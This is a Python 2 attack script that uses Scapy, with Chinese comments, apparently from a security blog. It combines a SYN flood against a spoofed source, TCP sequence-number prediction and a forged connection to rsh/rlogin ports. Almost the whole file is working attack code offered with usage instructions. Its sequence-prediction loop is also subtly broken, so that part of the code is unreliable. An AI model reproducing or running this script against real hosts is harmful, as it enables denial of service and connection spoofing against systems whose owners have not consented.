#!/usr/bin/env python
# -*- coding: utf-8 -*-
# -*- coding: gbk -*-
# Date: 2019/2/18
# Created by 冰河
# Description 使用Scapy制造SYN泛洪攻击、读取TCP序列号并伪造TCP连接
#             此脚本是scapy_syn_flood.py、scapy_syn_forge.py和scapy_syn_tcp.py的整合版
#             用法：python scapy_syn.py -s <src for SYN Flood> -S <src for spoofed connection> -t <target address>
# 博客 https://blog.csdn.net/l1028386804

import optparse
from scapy.all import *

#泛洪攻击
def synFlood(src, tgt):
    for sport in range(1024, 65535):
        IPlayer = IP(src=src, dst=tgt)
        TCPlayer = TCP(sport=sport, dport=513)
        pkt = IPlayer / TCPlayer
        send(pkt)

#读取TCP序列号
def calTSN(tgt):
    seqNum = 0
    preNum = 0
    diffSeq = 0
    for x in range(1, 5):
        if preNum != 0:
            preNum = seqNum
    pkt = IP(dst=tgt) /TCP()
    ans = sr1(pkt, verbose=0)
    seqNum = ans.getlayer(TCP).seq
    diffSeq = seqNum - preNum
    print '[+] TCP Seq Difference: ' + str(diffSeq)
    return seqNum + diffSeq

#伪造TCP连接
def spoofConn(src, tgt, ack):
    IPlayer = IP(src=src, dst=tgt)
    TCPlayer = TCP(sport=513, dport=514)
    synPkt = IPlayer / TCPlayer
    send(synPkt)
    IPlayer = IP(src=src, dst=tgt)
    TCPlayer = TCP(sport=513, dport=514, ack=ack)
    ackPkt = IPlayer / TCPlayer
    send(ackPkt)

#主函数
def main():
    parser = optparse.OptionParser('usage%prog -s <src for SYN Flood> -S <src for spoofed connection> -t <target address>')
    parser.add_option('-s', dest='synSpoof', type='string', help='specify src for SYN Flood')
    parser.add_option('-S', dest='srcSpoof', type='string', help='specify src for spoofed connection')
    parser.add_option('-t', dest='tgt', type='string', help='specify target address')
    (options, args) = parser.parse_args()
    synSpoof = options.synSpoof
    srcSpoof = options.srcSpoof
    tgt = options.tgt
    if synSpoof == None or srcSpoof == None or tgt == None:
        print parser.usage
        exit(0)
    print '[+] Starting SYN Flood to suppress remote server.'
    synFlood(synSpoof, srcSpoof)
    print '[+] Calculating correct TCP Sequence Number.'
    seqNum = calTSN(tgt) + 1
    print '[+] Spoofing Connection.'
    spoofConn(srcSpoof, tgt, seqNum)
    print 'Done.'

if __name__ == '__main__':
    main()